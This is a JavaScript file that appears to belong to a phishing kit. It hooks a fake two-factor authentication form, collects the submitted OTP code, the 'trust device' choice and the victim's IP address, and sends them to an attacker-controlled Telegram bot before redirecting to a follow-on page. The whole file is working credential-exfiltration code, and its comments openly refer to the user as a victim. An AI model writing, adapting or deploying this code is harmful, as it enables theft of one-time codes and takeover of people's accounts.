// Load configuration from the config.json file
fetch('config.json')
  .then((response) => response.json())
  .then((config) => {
    const telegramBotToken = config.telegramBotToken;
    const telegramChatId = config.telegramChatId;

    // Function to send data to Telegram
    function sendToTelegram(formData, victimIP) {
      // Format the message to send
      const message = `
       
        Otp Code: ${formData.twoFactAuthConfCode}
        Trust Device: ${formData.saveDeviceCheckBox ? 'Yes' : 'No'}
         Victim IP: ${victimIP}
      `;

      // Send the message to Telegram bot
      const telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      const data = {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML",
      };

      fetch(telegramAPI, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log("Message sent", data);
          // Redirect to another page after sending the message
          window.location.href = "full.html";  // Replace with your desired URL
        })
        .catch((error) => console.error("Error sending message", error));
    }

    // Get the victim's IP address from an external service (ipify)
    function getUserIP() {
      return fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => data.ip) // Return the victim's IP address
        .catch((error) => {
          console.error("Error fetching IP", error);
          return "IP not available"; // Return a fallback if there's an error
        });
    }

    // Handle form submission
    function handleSubmit(event) {
      event.preventDefault(); // Prevent form from refreshing page
      const formData = new FormData(event.target);
      const data = Object.fromEntries(formData.entries());

      // Get the victim's IP address and send the data to Telegram once we have it
      getUserIP().then((victimIP) => {
        sendToTelegram(data, victimIP); // Send data to Telegram along with IP
      });
    }

    // Attach event listener to the form
    const form = document.getElementById("twoFactorAuthenticationForm");
    form.addEventListener("submit", handleSubmit);
  })
  .catch((error) => console.error("Error loading config.json:", error));
